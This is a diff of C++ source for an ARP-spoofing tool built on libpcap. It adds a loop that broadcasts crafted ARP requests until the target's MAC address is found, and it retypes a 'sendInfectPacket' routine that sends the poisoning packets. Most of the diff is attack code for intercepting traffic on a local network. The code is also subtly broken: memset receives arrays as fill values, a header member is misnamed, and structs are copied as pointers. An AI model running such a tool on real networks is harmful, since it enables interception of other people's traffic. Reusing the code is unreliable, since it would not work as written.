@@ -3,12 +3,7 @@
 ArpSpoof::ArpSpoof(u_char& iface) : interface{ iface }, arpHdr{ 0 }, etherHdr{ 0 }
 {
 	memset(senderMacAddress, 0x00, 6);
-	memset(targetMacAddress, 0x00, 6);
-}
-
-ArpSpoof::~ArpSpoof()
-{
-	// do nothing
+	memset(targetMacAddress, 0xFF, 6);
 }
 
 int
@@ -36,18 +31,36 @@ ArpSpoof::setSenderMacAddress()
 	return 0;
 }
 
-u_char*
-ArpSpoof::setTargetMacAddress(pcap_t* handle, u_char& senderIpAddress, u_char& senderMacAddress, u_char& targetIpAddress, u_char& targetMacAddress) 
+int
+ArpSpoof::setTargetMacAddress(pcap_t* handle, uint8_t& senderIpAddress, uint8_t& targetIpAddress) 
 {
 	// getting MAC Address through Broadcasting.
-	
-	
+	uint8_t packet[sizeof(etherHeader) + sizeof(arpHeader)];
 
-	return mac;	
+	setEtherHeader();
+	setArpHeader(senderIpAddress, targetIpAddress);
+
+	memcpy(packet, this->ethHdr, sizeof(etherHeader));
+	memcpy(packet + sizeof(etherHeader), this->arpHdr, sizeof(arpHeader));
+	
+	while (1) {
+		cout << "[*] Broadcasting for getting Target MAC Address" << endl;
+		if (pcap_sendpacket(handle, packet, sizeof(packet))) {
+			perror("pcap_sendpacket");
+			exit(EXIT_FAILURE);
+		}
+		sleep(1);
+
+		if (receiveTargetMacAddress()) {
+			break;
+		}
+	}
+
+	return 0;	
 }
 
 int
-ArpSpoof::setArpHeader(char& senderIpAddress, char& targetIpAddress)
+ArpSpoof::setArpHeader(uint8_t& senderIpAddress, uint8_t& targetIpAddress)
 {
 	memset(this->arpHdr.senderHardwareAddress, this->senderMacAddress, 6);
 	memset(this->arpHdr.targetHardwareAddress, this->targetMacAddress, 6);
@@ -70,9 +83,9 @@ ArpSpoof::setEtherHeader()
 }
 	
 int
-ArpSpoof::sendInfectPacket(IN pcap_t* handle, IN char* senderIpAddress, IN char* targetIpAddress)
+ArpSpoof::sendInfectPacket(IN pcap_t* handle, IN uint8_t* senderIpAddress, IN uint8_t* targetIpAddress)
 {
-	u_char* senderMacAddress;
+	uint8_t* senderMacAddress;
 	uint8_t packet[sizeof(etherHeader) + sizeof(arpHeader)];
 	etherHeader* ethernetPacket;
 	arpHeader* arpPacket;
